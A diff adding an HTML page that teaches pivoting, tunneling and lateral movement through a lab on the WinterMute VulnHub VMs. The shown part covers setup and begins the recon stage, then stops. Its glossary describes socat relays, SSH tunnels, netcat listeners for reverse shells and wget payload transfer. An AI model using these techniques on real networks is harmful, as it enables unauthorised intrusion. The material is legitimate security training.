@@ -1,0 +1,1093 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ML4GP9590F"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-ML4GP9590F');
+    </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pivoting &amp; Tunneling — Learn It on a Real Two-Network Lab | sarathg.me</title>
+    <meta name="description" content="An interactive concept explainer plus a hands-on lab guide to port forwarding, tunneling, pivoting, and lateral movement — practiced against WinterMute, a free two-network VulnHub lab. By Sarath G — sarathg.me" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.78em' x='.5em' text-anchor='middle' font-size='80' fill='%2316324f'>%E2%9C%B3</text></svg>" />
+    <style>
+:root {
+  --bg: #eef1f6;
+  --bg-raised: #ffffff;
+  --bg-sunken: #e2e8f0;
+  --text: #33465a;
+  --heading: #16324f;
+  --muted: #5c7086;
+  --muted-2: #8a99a8;
+  --rule: #c3cedb;
+  --rule-strong: #a8b7c7;
+  --accent: #3d6ea5;
+  --accent-soft: #dde6f0;
+  --accent-ink: #16324f;
+  --highlight: #a15a1f;
+  --exercise-bg: #ffffff;
+  --exercise-border: #b7c4d2;
+  --warning-bg: #fbeeec;
+  --warning-border: #b23b2e;
+  --warning-text: #7a2a22;
+  --tip-bg: #eaf3ee;
+  --tip-border: #2c6e50;
+  --tip-text: #1e4a37;
+  --code-text: #16324f;
+  --code-border: #b7c4d2;
+  --code-window: #f4f7fa;
+}
+
+* { box-sizing: border-box; }
+html, body { height: 100%; }
+body { margin: 0; background: var(--bg); color: var(--text); font-family: "Inter", "Helvetica Neue", sans-serif; -webkit-font-smoothing: antialiased; overflow: hidden; }
+#root { height: 100%; }
+::selection { background: #c7d9ec; }
+
+/* ---------- App shell + global header ---------- */
+
+.app-shell { display: flex; flex-direction: column; height: 100%; }
+
+.header-strip {
+  flex-shrink: 0;
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  align-items: center;
+  padding: 11px 22px;
+  border-bottom: 1px solid var(--rule);
+  background: var(--bg-raised);
+}
+.brand-block { display: flex; align-items: center; gap: 8px; justify-self: start; text-decoration: none; color: var(--heading); }
+.brand-mark { display: inline-block; color: var(--accent); font-size: 15px; }
+.brand-name { font-family: "JetBrains Mono", monospace; font-weight: 700; font-size: 12px; letter-spacing: 0.02em; white-space: nowrap; }
+
+.view-switch { justify-self: center; display: flex; gap: 3px; background: var(--bg-sunken); padding: 3px; border-radius: 6px; }
+.view-btn { font-family: "JetBrains Mono", monospace; font-size: 11px; font-weight: 600; letter-spacing: 0.02em; color: var(--muted); background: none; border: none; padding: 6px 14px; border-radius: 4px; cursor: pointer; }
+.view-btn.active { background: #fff; color: var(--accent-ink); box-shadow: 0 1px 3px rgba(22,50,79,0.14); }
+
+.header-right { justify-self: end; }
+.header-link { font-family: "JetBrains Mono", monospace; font-size: 11px; font-weight: 600; color: var(--accent); text-decoration: none; white-space: nowrap; }
+.header-link:hover { text-decoration: underline; }
+
+/* ============================================================
+   CONCEPTS VIEW — centered, mostly-interactive, minimal chrome
+   ============================================================ */
+
+.concepts-view { flex: 1; overflow-y: auto; background: #ffffff; }
+.concepts-inner { max-width: clamp(560px, 58vw, 880px); margin: 0 auto; padding: clamp(32px, 5vw, 56px) clamp(20px, 4vw, 40px) 70px; text-align: center; }
+
+.concepts-eyebrow { font-family: "JetBrains Mono", monospace; font-size: 11px; letter-spacing: 0.1em; color: var(--accent); margin: 0 0 14px; }
+.concepts-title { font-family: "JetBrains Mono", monospace; font-size: clamp(23px, 4vw, 31px); font-weight: 700; color: var(--heading); line-height: 1.32; margin: 0 0 12px; }
+.concepts-sub { font-size: 14.5px; color: var(--muted); line-height: 1.65; margin: 0 0 26px; }
+
+.mode-switch { display: inline-flex; flex-wrap: wrap; justify-content: center; gap: 5px; background: var(--bg-sunken); padding: 5px; border-radius: 24px; margin-bottom: 26px; }
+.mode-btn { font-family: "JetBrains Mono", monospace; font-size: 11px; font-weight: 600; color: var(--muted); background: none; border: none; padding: 8px 14px; border-radius: 20px; cursor: pointer; }
+.mode-btn.active { background: var(--accent-ink); color: #fff; }
+
+.concept-diagram { background: var(--bg-raised); border: 1px solid var(--rule-strong); border-radius: 8px; padding: 12px 14px 16px; margin-bottom: 22px; }
+
+.blocked-route { display: flex; align-items: center; justify-content: center; gap: 7px; height: 22px; opacity: 0; transition: opacity 0.3s; font-family: "JetBrains Mono", monospace; font-size: 9px; color: var(--warning-border); font-weight: 600; }
+.blocked-route.show { opacity: 1; }
+
+.concept-tag-top { text-align: center; font-family: "JetBrains Mono", monospace; font-size: 10px; font-weight: 700; letter-spacing: 0.04em; color: var(--accent-ink); background: var(--accent-soft); display: inline-block; padding: 3px 10px; border-radius: 3px; margin: 0 auto 8px; }
+.concept-tag-top-wrap { text-align: center; }
+
+.concept-stage { position: relative; width: 100%; max-width: clamp(480px, 52vw, 760px); margin: 6px auto 0; }
+.concept-stage-svg { position: absolute; inset: 0; width: 100%; height: 100%; display: block; }
+.concept-overlay { position: absolute; inset: 0; pointer-events: none; }
+
+/* -- marker: position driven by JS inline style, CSS just smooths the move -- */
+.concept-marker { position: absolute; transform: translate(-50%, -50%); font-family: "JetBrains Mono", monospace; white-space: nowrap; transition: left 0.7s ease, top 0.7s ease, opacity 0.4s ease; }
+.concept-badge { font-size: 9px; font-weight: 700; color: #fff; background: var(--highlight); padding: 4px 8px; border-radius: 3px; }
+.concept-badge.encrypted-style { background: #fff; color: var(--tip-border); border: 1.5px dashed var(--tip-border); }
+.concept-badge.lateral-style { background: var(--accent-ink); }
+.concept-home-marker { font-size: 6.5px; font-weight: 700; color: var(--accent); background: var(--accent-soft); padding: 2px 6px; border-radius: 3px; transition: opacity 0.4s ease; }
+
+/* -- pivot: reveal driven by JS opacity toggles, CSS just fades smoothly -- */
+.concept-fade { transition: opacity 0.5s ease; }
+@keyframes revealPulse { 0% { opacity: 0.5; transform: scale(0.9); } 70% { opacity: 0; transform: scale(1.3); } 100% { opacity: 0; transform: scale(1.3); } }
+.pivot-pulse { animation: revealPulse 0.9s ease-out forwards; transform-box: fill-box; transform-origin: center; }
+
+/* -- caption bar: fixed place, generous hold time controlled in JS -- */
+.concept-caption-bar { min-height: 4.2em; margin-top: 12px; padding: 10px 12px; background: var(--bg-sunken); border-radius: 4px; display: flex; flex-direction: column; gap: 4px; text-align: left; }
+.concept-step-label { font-family: "JetBrains Mono", monospace; font-size: 9px; font-weight: 700; letter-spacing: 0.05em; color: var(--accent); }
+.concept-caption-text { font-family: "Inter", sans-serif; font-size: 12.5px; line-height: 1.55; color: var(--text); transition: opacity 0.25s ease; }
+
+.concept-replay-btn { display: inline-flex; align-items: center; gap: 6px; margin-top: 10px; font-family: "JetBrains Mono", monospace; font-size: 11px; font-weight: 700; color: #fff; background: var(--accent-ink); border: none; padding: 7px 14px; border-radius: 3px; cursor: pointer; }
+.concept-replay-btn:hover { background: var(--accent); }
+
+.concept-legend { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 12px; padding-top: 10px; border-top: 1px solid var(--rule); justify-content: center; }
+.concept-legend-item { display: flex; align-items: center; gap: 5px; font-family: "JetBrains Mono", monospace; font-size: 9px; color: var(--muted); }
+.concept-legend-swatch { width: 14px; height: 2px; background: var(--accent-ink); flex-shrink: 0; }
+.concept-legend-swatch.dashed { background: none; border-top: 2px dashed var(--muted-2); height: 0; }
+.concept-legend-chip { width: 9px; height: 9px; border-radius: 2px; flex-shrink: 0; }
+.concept-legend-chip.plain { background: var(--highlight); }
+.concept-legend-chip.encrypted { background: #fff; border: 1.5px dashed var(--tip-border); }
+.concept-legend-chip.compromised { background: var(--warning-bg); border: 1.5px solid var(--highlight); }
+
+.concept-tag { text-align: center; font-family: "JetBrains Mono", monospace; font-size: 10.5px; font-weight: 700; letter-spacing: 0.04em; color: var(--accent-ink); margin-top: 14px; }
+.concept-tag::before { content: "[ "; color: var(--muted-2); }
+.concept-tag::after { content: " ]"; color: var(--muted-2); }
+
+.concepts-blurb { font-size: 14.5px; line-height: 1.7; color: var(--text); margin: 0 0 18px; text-align: left; }
+
+.lateral-note { text-align: left; background: var(--tip-bg); border-left: 3px solid var(--tip-border); padding: 12px 15px; border-radius: 0 4px 4px 0; margin: 0 0 22px; }
+.lateral-note p { font-size: 13px; line-height: 1.6; color: var(--tip-text); margin: 0 0 7px; }
+.lateral-note p:last-child { margin-bottom: 0; }
+.lateral-note strong { font-family: "JetBrains Mono", monospace; }
+
+.concepts-keypoints { text-align: left; margin-bottom: 28px; }
+.concepts-keypoints .key-points { margin: 0; padding-left: 0; }
+
+.cta-btn { font-family: "JetBrains Mono", monospace; font-size: 13px; font-weight: 700; color: #fff; background: var(--accent-ink); border: none; padding: 13px 26px; border-radius: 4px; cursor: pointer; }
+.cta-btn:hover { background: var(--accent); }
+
+/* ============================================================
+   LAB VIEW — sheet index + single-sheet content pane
+   ============================================================ */
+
+.shell-body { display: flex; flex: 1; min-height: 0; }
+
+.sheet-index { width: 210px; flex-shrink: 0; background: var(--bg-sunken); border-right: 1px solid var(--rule); padding: 16px 0; overflow-y: auto; display: flex; flex-direction: column; }
+.sheet-index-label { font-family: "JetBrains Mono", monospace; font-size: 9.5px; letter-spacing: 0.08em; color: var(--muted); padding: 0 16px 10px; border-bottom: 1px solid var(--rule); margin-bottom: 4px; }
+.sheet-item { display: block; width: 100%; text-align: left; background: none; border: none; border-left: 3px solid transparent; padding: 9px 16px; cursor: pointer; font-family: inherit; }
+.sheet-item:hover { background: rgba(255,255,255,0.5); }
+.sheet-item.active { background: var(--bg-raised); border-left-color: var(--module-accent, var(--accent)); }
+.sheet-item-num { font-family: "JetBrains Mono", monospace; font-size: 9px; color: var(--accent); margin-bottom: 2px; }
+.sheet-item.active .sheet-item-num { color: var(--module-accent, var(--accent)); }
+.sheet-item-title { font-family: "JetBrains Mono", monospace; font-size: 11.5px; color: var(--muted); line-height: 1.4; display: flex; align-items: center; gap: 6px; }
+.sheet-item.active .sheet-item-title { color: var(--heading); font-weight: 700; }
+.sheet-item-check { color: var(--tip-border); font-size: 10.5px; }
+.sheet-index-footer { margin-top: auto; padding: 14px 16px 4px; border-top: 1px solid var(--rule); }
+.sheet-index-progress-label { font-family: "JetBrains Mono", monospace; font-size: 9px; color: var(--muted); margin-bottom: 6px; }
+.sheet-index-progress-track { height: 4px; background: var(--rule-strong); border-radius: 2px; overflow: hidden; }
+.sheet-index-progress-fill { height: 100%; background: var(--accent-ink); transition: width 0.2s ease; }
+
+.sheet-content { flex: 1; min-width: 0; overflow-y: auto; }
+.sheet-content-inner { max-width: clamp(560px, 46vw, 760px); margin: 0 auto; padding: 30px 26px 56px; }
+
+.back-link { display: inline-block; font-family: "JetBrains Mono", monospace; font-size: 11px; color: var(--accent); margin-bottom: 16px; cursor: pointer; background: none; border: none; padding: 0; }
+.back-link:hover { text-decoration: underline; }
+
+.sheet-meta { font-family: "JetBrains Mono", monospace; font-size: 10.5px; font-weight: 600; letter-spacing: 0.04em; color: var(--module-accent, var(--accent)); margin: 0 0 9px; }
+.sheet-meta::before { content: "["; color: var(--muted-2); }
+.sheet-meta::after { content: "]"; color: var(--muted-2); }
+.sheet-title { font-family: "JetBrains Mono", monospace; font-size: clamp(20px, 3vw, 25px); font-weight: 700; color: var(--heading); line-height: 1.3; margin: 0 0 11px; }
+.sheet-blurb { font-size: 14.5px; line-height: 1.6; color: var(--muted); margin: 0 0 26px; max-width: 520px; }
+
+.content-section { margin-bottom: 28px; }
+.content-section h3 { position: relative; font-family: "JetBrains Mono", monospace; font-size: 14.5px; font-weight: 600; color: var(--heading); margin: 0 0 11px; line-height: 1.4; padding-left: 15px; }
+.content-section h3::before { content: ""; position: absolute; left: 0; top: 5px; width: 7px; height: 7px; background: var(--module-accent, var(--accent)); }
+.content-section p { font-size: 14.5px; line-height: 1.7; color: var(--text); margin: 0 0 13px; }
+
+.plain-steps, .key-points { margin: 0 0 13px; padding-left: 22px; }
+.plain-steps li, .key-points li { font-size: 14px; line-height: 1.65; color: var(--text); margin-bottom: 7px; }
+.key-points { list-style: none; padding-left: 0; }
+.key-points li { padding-left: 20px; position: relative; }
+.key-points li::before { content: "\2192"; position: absolute; left: 0; color: var(--module-accent, var(--accent)); font-weight: 700; }
+
+.table-wrap { overflow-x: auto; margin: 4px 0 18px; border: 1px solid var(--rule-strong); border-radius: 4px; }
+table { width: 100%; border-collapse: collapse; font-family: "Inter", sans-serif; font-size: 12.5px; background: var(--bg-raised); }
+th { text-align: left; padding: 8px 12px; background: var(--accent-soft); color: var(--heading); font-weight: 600; font-family: "JetBrains Mono", monospace; font-size: 10px; letter-spacing: 0.02em; border-bottom: 1px solid var(--rule-strong); white-space: nowrap; }
+td { padding: 8px 12px; border-bottom: 1px solid var(--rule); color: var(--text); line-height: 1.5; vertical-align: top; }
+tr:last-child td { border-bottom: none; }
+td:first-child { font-weight: 600; color: var(--heading); }
+
+/* ---------- Transcript panels (primary content format for stages) ---------- */
+
+.transcript { background: #fff; border: 1px solid var(--code-border); border-radius: 4px; padding: 13px 15px 11px; margin: 4px 0 14px; position: relative; }
+.transcript-copy { position: absolute; top: 8px; right: 8px; background: #fff; border: 1px solid var(--code-border); color: var(--muted); font-family: "JetBrains Mono", monospace; font-size: 9.5px; padding: 3px 8px; border-radius: 3px; cursor: pointer; }
+.transcript-copy:hover { background: var(--accent-soft); color: var(--accent-ink); }
+.transcript-line { font-family: "JetBrains Mono", monospace; font-size: 12px; line-height: 1.85; color: var(--code-text); word-break: break-word; }
+.transcript-prompt { color: var(--muted-2); margin-right: 7px; }
+.transcript-output { font-family: "JetBrains Mono", monospace; font-size: 11.5px; line-height: 1.7; color: var(--muted); white-space: pre-wrap; margin: 0 0 2px; word-break: break-word; }
+.transcript-note { display: flex; gap: 7px; margin: 6px 0 9px; padding: 6px 10px; background: var(--tip-bg); border-left: 2px solid var(--tip-border); font-family: "Inter", sans-serif; font-size: 11.5px; color: var(--tip-text); line-height: 1.55; border-radius: 0 3px 3px 0; }
+.transcript-note-arrow { flex-shrink: 0; }
+
+/* ---------- Code blocks (setup module still uses these) ---------- */
+
+.code-block { position: relative; margin: 4px 0 14px; border-radius: 4px; overflow: hidden; background: var(--code-window); border: 1px solid var(--code-border); }
+.code-block pre { margin: 0; padding: 14px 16px; overflow-x: auto; font-family: "JetBrains Mono", "IBM Plex Mono", monospace; font-size: 12px; line-height: 1.7; color: var(--code-text); white-space: pre-wrap; word-break: break-word; }
+.copy-btn { position: absolute; top: 8px; right: 8px; background: #ffffff; border: 1px solid var(--code-border); color: var(--muted); font-family: "JetBrains Mono", monospace; font-size: 9.5px; font-weight: 500; padding: 3px 8px; border-radius: 3px; cursor: pointer; }
+.copy-btn:hover { background: var(--accent-soft); color: var(--accent-ink); }
+
+/* ---------- Exercise / callouts / downloads ---------- */
+
+.exercise { margin: 14px 0 18px; padding: 15px 17px 17px; background: var(--exercise-bg); border: 1px solid var(--exercise-border); border-radius: 4px; }
+.exercise-label { font-family: "JetBrains Mono", monospace; font-size: 11.5px; font-weight: 700; color: var(--highlight); margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+.exercise-tag { font-family: "JetBrains Mono", monospace; font-size: 9px; font-weight: 700; letter-spacing: 0.06em; color: var(--highlight); border: 1px solid var(--highlight); padding: 2px 6px; border-radius: 3px; }
+.exercise-steps { margin: 0 0 12px; padding-left: 20px; }
+.exercise-steps li { font-size: 13.5px; line-height: 1.6; color: var(--text); margin-bottom: 7px; }
+.exercise-body { font-size: 13.5px; line-height: 1.65; color: var(--text); margin: 0 0 4px; }
+.followup { margin-top: 13px; padding-top: 13px; border-top: 1px dashed var(--exercise-border); }
+
+.callout { display: flex; gap: 9px; align-items: baseline; margin: 4px 0 15px; padding: 9px 13px; border-radius: 3px; font-size: 13px; line-height: 1.6; }
+.callout-warning { background: var(--warning-bg); border-left: 3px solid var(--warning-border); color: var(--warning-text); }
+.callout-tip { background: var(--tip-bg); border-left: 3px solid var(--tip-border); color: var(--tip-text); }
+.callout-label { font-family: "JetBrains Mono", monospace; font-size: 9.5px; font-weight: 700; letter-spacing: 0.04em; flex-shrink: 0; opacity: 0.85; padding-top: 1px; }
+.callout-label::before { content: "["; }
+.callout-label::after { content: "]"; }
+
+.downloads { display: flex; flex-wrap: wrap; gap: 9px; margin: 6px 0 15px; }
+.download-btn { display: inline-flex; align-items: center; gap: 7px; font-family: "JetBrains Mono", monospace; font-size: 12px; font-weight: 600; color: var(--accent-ink); background: #fff; border: 1px solid var(--accent); padding: 8px 12px; border-radius: 3px; text-decoration: none; }
+.download-btn:hover { background: var(--accent); color: #fff; }
+
+.diagram-wrap { margin: 4px 0 18px; padding: 15px; background: var(--bg-raised); border: 1px solid var(--rule-strong); border-radius: 4px; }
+.diagram-caption { font-family: "JetBrains Mono", monospace; font-size: 10.5px; color: var(--muted); text-align: center; margin: 9px 0 0; line-height: 1.6; }
+
+.progress-toggle { display: inline-flex; align-items: center; gap: 7px; margin: 4px 0 8px; padding: 7px 13px; border: 1px solid var(--rule-strong); border-radius: 3px; background: var(--bg-raised); font-family: "JetBrains Mono", monospace; font-size: 11.5px; font-weight: 600; color: var(--muted); cursor: pointer; }
+.progress-toggle:hover { border-color: var(--module-accent, var(--accent)); color: var(--module-accent, var(--accent)); }
+.progress-toggle.done { background: var(--module-accent, var(--accent)); border-color: var(--module-accent, var(--accent)); color: #fff; }
+.progress-check { display: inline-flex; align-items: center; justify-content: center; width: 13px; height: 13px; border: 1.5px solid currentColor; font-size: 8.5px; }
+.progress-toggle.done .progress-check { background: rgba(255,255,255,0.25); }
+
+.brand-banner { display: flex; align-items: center; justify-content: space-between; gap: 14px; margin: 22px 0 6px; padding: 14px 16px; background: var(--accent-ink); border-radius: 4px; text-decoration: none; }
+.brand-banner-text { font-family: "Inter", sans-serif; font-size: 13px; line-height: 1.5; color: #dce8f5; }
+.brand-banner-text strong { color: #fff; font-weight: 600; font-family: "JetBrains Mono", monospace; }
+.brand-banner-arrow { font-size: 15px; color: #fff; flex-shrink: 0; }
+
+.code-term { cursor: pointer; text-decoration: underline; text-decoration-style: dotted; text-decoration-color: var(--highlight); text-underline-offset: 3px; color: var(--highlight); }
+.code-term:hover { background: rgba(161,90,31,0.12); }
+
+.glossary-popover { z-index: 500; width: 300px; max-width: calc(100vw - 32px); background: var(--bg-raised); border: 1px solid var(--rule-strong); border-radius: 6px; box-shadow: 0 10px 28px rgba(22,50,79,0.16); padding: 13px 15px; font-family: "Inter", sans-serif; animation: popIn 0.14s ease; }
+@keyframes popIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+.glossary-popover-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 7px; }
+.glossary-popover-header code { font-family: "JetBrains Mono", monospace; font-size: 11.5px; font-weight: 600; color: var(--heading); background: var(--accent-soft); padding: 2px 6px; border-radius: 3px; }
+.glossary-cat { font-family: "JetBrains Mono", monospace; font-size: 9px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 0.04em; }
+.glossary-short { font-size: 12px; font-weight: 600; color: var(--heading); line-height: 1.5; margin: 0 0 7px; }
+.glossary-long { font-size: 11.5px; line-height: 1.6; color: var(--muted); margin: 0 0 9px; }
+.glossary-more { font-family: "JetBrains Mono", monospace; font-size: 10.5px; font-weight: 600; color: var(--accent); text-decoration: none; }
+.glossary-more:hover { text-decoration: underline; }
+
+.ref-list { display: grid; gap: 4px; }
+.ref-entry { padding: 13px 0; border-bottom: 1px solid var(--rule); }
+.ref-entry-head { display: flex; align-items: baseline; gap: 9px; margin-bottom: 5px; }
+.ref-entry-head code { font-family: "JetBrains Mono", monospace; font-size: 13px; font-weight: 600; color: var(--heading); }
+.ref-cat { font-family: "JetBrains Mono", monospace; font-size: 9px; font-weight: 600; color: var(--accent); text-transform: uppercase; letter-spacing: 0.05em; }
+.ref-short { font-size: 13px; font-weight: 600; color: var(--text); margin: 0 0 4px; font-family: "Inter", sans-serif; }
+.ref-long { font-size: 12.5px; line-height: 1.6; color: var(--muted); margin: 0; }
+
+.sheet-nav { display: flex; justify-content: space-between; align-items: center; margin-top: 26px; padding-top: 15px; border-top: 1px solid var(--rule); }
+.sheet-nav-btn { display: flex; flex-direction: column; gap: 2px; background: none; border: none; cursor: pointer; font-family: "JetBrains Mono", monospace; padding: 4px 0; }
+.sheet-nav-btn:disabled { cursor: default; opacity: 0.35; }
+.sheet-nav-btn-dir { font-size: 9px; letter-spacing: 0.06em; color: var(--muted-2); }
+.sheet-nav-btn-label { font-size: 12px; font-weight: 600; color: var(--accent); }
+.sheet-nav-btn:disabled .sheet-nav-btn-label { color: var(--muted-2); }
+.sheet-nav-btn.next { text-align: right; align-items: flex-end; }
+
+.sheet-footnote { margin-top: 22px; padding-top: 14px; border-top: 1px solid var(--rule); font-family: "Inter", sans-serif; font-size: 11.5px; color: var(--muted-2); line-height: 1.6; }
+
+/* ---------- Responsive ---------- */
+
+@media (max-width: 760px) {
+  body { overflow: auto; }
+  .app-shell { height: auto; min-height: 100%; }
+  .header-strip { grid-template-columns: auto 1fr auto; padding: 10px 14px; }
+  .brand-name { display: none; }
+  .shell-body { flex-direction: column; min-height: auto; }
+  .sheet-index { width: 100%; flex-direction: row; overflow-x: auto; overflow-y: hidden; padding: 8px 0; align-items: center; }
+  .sheet-index-label { display: none; }
+  .sheet-item { border-left: none; border-bottom: 3px solid transparent; flex-shrink: 0; padding: 7px 13px; white-space: nowrap; }
+  .sheet-item.active { border-bottom-color: var(--module-accent, var(--accent)); }
+  .sheet-index-footer { display: none; }
+  .sheet-content { overflow-y: visible; }
+  .concepts-view { overflow-y: visible; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  * { animation: none !important; transition: none !important; }
+}
+    </style>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+  </head>
+  <body>
+    <script src="navbar.js"></script>
+    <div id="root"></div>
+    <script>
+const h = React.createElement;
+const { useState, useEffect, useRef } = React;
+
+/* ============================================================
+   COMMAND GLOSSARY (lab view)
+   ============================================================ */
+
+const glossary = {
+  nmap: { category: "Recon", short: "Scans a host for open ports and fingerprints running services.", long: "-Pn skips the host-alive ping check, -sV grabs version banners, -sC runs default scripts, -p- scans all 65535 ports. Often NOT installed on a machine you've compromised \u2014 later stages fall back to nc loops instead." },
+  socat: { category: "Pivoting", short: "Relays raw traffic between two endpoints \u2014 the core pivoting workhorse.", long: "socat TCP-LISTEN:PORT,fork,reuseaddr TCP:DEST:PORT opens a listener on the pivot host and forwards every connection to a destination it can reach but you can't. Moves bytes unmodified \u2014 no encryption, unlike an SSH tunnel." },
+  ssh: { category: "Tunneling", short: "Secure shell \u2014 and, via -L / -R / -D, a built-in encrypted tunnel.", long: "-L forwards a local port out to a remote destination, -R forwards a remote port back to your machine, -D turns the connection into a SOCKS proxy. Everything is encrypted, and you only need valid credentials \u2014 no separate binary on the target." },
+  nc: { category: "Utility", short: "Netcat \u2014 reads and writes raw TCP or UDP connections directly.", long: "-lvnp opens a verbose listener (catches reverse shells). Also useful as a crude port scanner (nc -nvzw1 host port) when nmap isn't available." },
+  curl: { category: "Utility", short: "Sends an HTTP request from the command line.", long: "Used to trigger vulnerable endpoints and POST data without a browser \u2014 handy once you're working from a shell." },
+  wget: { category: "Utility", short: "Downloads a file from a URL straight to disk.", long: "Paired with python3 -m http.server: host a file on your attacking machine, wget it on the target. This pattern repeats three times in this lab." },
+  gcc: { category: "Utility", short: "Compiles C source code into a runnable binary.", long: "If the target has no compiler, compile locally instead and transfer the finished binary \u2014 architecture permitting." },
+  searchsploit: { category: "Recon", short: "Searches a local, offline copy of Exploit-DB for matching exploits.", long: "Once you've fingerprinted an exact software version, searchsploit <name> <version> checks whether a public exploit already exists \u2014 often the fastest path from version number to working code." },
+  telnet: { category: "Utility", short: "Opens a raw, unencrypted connection so you can type a protocol by hand.", long: "Useful for manually speaking a plaintext protocol line-by-line \u2014 like typing SMTP commands directly at a mail server." },
+  ifconfig: { category: "Recon", short: "Lists network interfaces and the addresses assigned to them.", long: "The first command worth running on any new shell \u2014 often reveals a second, otherwise-invisible network segment, which is what turns a host into a pivot point." }
+};
+const glossaryOrder = ["nmap", "socat", "ssh", "nc", "curl", "wget", "gcc", "searchsploit", "telnet", "ifconfig"];
+
+/* ============================================================
+   CONCEPTS VIEW DATA
+   ============================================================ */
+
+const modes = [
+  { id: "forward", label: "Port forwarding", tag: "ONE HOP, PLAINTEXT", blurb: "A single relay hop from Jump A to one internal service \u2014 here, the DB server. No encryption, no protocol change. Only that one path lights up, and your shell never moves." },
+  { id: "tunnel", label: "Tunneling", tag: "ONE HOP, ENCRYPTED", blurb: "The identical single hop, but wrapped in SSH for the leg between you and Jump A \u2014 then naked again for the last leg to the DB server. Tunneling protects the hop TO your pivot, not automatically everything past it." },
+  { id: "combo", label: "Forward + tunnel", tag: "TWO HOPS, LAYERED", blurb: "In practice these two are usually layered, not swapped for each other: an encrypted SSH tunnel gets you onto Jump A, then a plain socat relay chains onward to Jump B \u2014 a machine SSH alone couldn't reach in one hop." },
+  { id: "pivot", label: "Pivoting", tag: "TWO+ HOPS \u2192 SEGMENT", blurb: "Compromise Jump A, then Jump B behind it, and the entire internal segment opens up \u2014 every machine becomes reachable, not just one. A single relay can't show this: pivoting chains through hosts, and the reach compounds with each hop." },
+  { id: "lateral", label: "Lateral movement", tag: "SHELL LANDS ON THE DC", blurb: "The odd one out. Watch the badge \u2014 it doesn't just relay traffic to the domain controller, it moves there and stays. That's an actual foothold on a second machine, not a path through one." }
+];
+
+/* ============================================================
+   LAB DATA
+   ============================================================ */
+
+const modules = [{
+  id: "setup",
+  day: "Before you start",
+  accent: "#9c6b12",
+  title: "Lab Setup \u2014 Two Networks, Three Machines",
+  blurb: "The network topology IS the lesson. Get the two host-only networks wired correctly and pivoting stops being an abstract diagram.",
+  sections: [{
+    heading: "Before you start",
+    body: "WinterMute is a deliberately vulnerable VM released free on VulnHub for legal practice. Running these techniques against anything you don't own or have written permission to test is illegal in most jurisdictions \u2014 keep this lab on an isolated, offline virtual network.",
+    warning: "Educational use against your own local WinterMute VMs only."
+  }, {
+    heading: "What you'll need",
+    keyPoints: [
+      "A computer that can run 2\u20133 VMs at once \u2014 8GB+ RAM recommended",
+      "VirtualBox (free) and a Kali VM",
+      "The WinterMute VMs (free \u2014 linked below)",
+      "Roughly 3\u20135 hours"
+    ],
+    downloads: [
+      { label: "VirtualBox \u2014 free download", url: "https://www.virtualbox.org/" },
+      { label: "WinterMute \u2014 official VulnHub entry", url: "https://www.vulnhub.com/entry/wintermute-1,239/" }
+    ]
+  }, {
+    heading: "Download and verify the archive",
+    body: "WinterMute ships as Wintermute-v1.zip (2.4 GB) \u2014 both VMs plus the author's setup notes. Verify the hash before importing anything.",
+    exercise: {
+      label: "Verify the archive hash",
+      code: "md5sum Wintermute-v1.zip\n# should match: 4BFABB5021B33C2A4AB7A5DB1F17A9ED\n\nsha1sum Wintermute-v1.zip\n# should match: 643D14EDCADA7EEF08C66DBD4CF89AABFD6097A3"
+    },
+    tip: "Works better in VirtualBox than VMware, per the author's notes."
+  }, {
+    heading: "Two host-only networks, two different subnets",
+    body: "Network #1 holds Kali and Straylight. Network #2 holds Straylight and Neuromancer \u2014 reachable only through Straylight.",
+    steps: [
+      "VirtualBox: File \u2192 Tools \u2192 Network Manager.",
+      "Create a host-only adapter (vboxnet0). Default DHCP is fine.",
+      "Create a second one (vboxnet1) on a DIFFERENT subnet \u2014 e.g. 192.168.56.0/24 and 192.168.57.0/24."
+    ],
+    warning: "Same subnet on both = Kali reaches Neuromancer directly and the whole exercise collapses without you noticing."
+  }, {
+    heading: "Wiring the three machines",
+    table: {
+      headers: ["Machine", "Adapter 1", "Adapter 2"],
+      rows: [
+        ["Kali", "Network #1", "NAT (optional, internet only)"],
+        ["Straylight", "Network #1", "Network #2 \u2014 enabled. This makes it the pivot."],
+        ["Neuromancer", "Network #2 only", "Disabled"]
+      ]
+    }
+  }, {
+    heading: "Verify the topology before touching an exploit",
+    exercise: {
+      label: "Confirm Network #2 is unreachable directly",
+      steps: [
+        "Start all three machines.",
+        "Kali: ip a \u2014 confirm Network #1 address.",
+        "ping <straylight_ip> \u2014 should succeed.",
+        "Try reaching the Network #2 range directly from Kali \u2014 should FAIL."
+      ],
+      body: "If step 4 fails as expected: Kali \u2192 Straylight \u2192 Neuromancer is correctly isolated. If it succeeds, revisit the adapter settings."
+    }
+  }]
+}, {
+  id: "foothold",
+  day: "Stage 1",
+  accent: "#a3402c",
+  title: "Getting a Foothold on Straylight",
+  blurb: "Recon, an exposed monitoring tool, a file-read bug, and a mail-log trick that turns into code execution.",
+  sections: [{
+    heading: "Recon",
+    transcript: [
+      { prompt: "kali:~$", cmd: "nmap -Pn -sT -sV -sC -p- <straylight_ip>" },
+      { output: "25/tcp   open  smtp\n80/tcp   open  http\n3000/tcp open  ppp (ntopng)" },
+      { note: "Three ports. 3000 is ntopng \u2014 a monitoring tool. Start there." }
+    ]
+  }, {
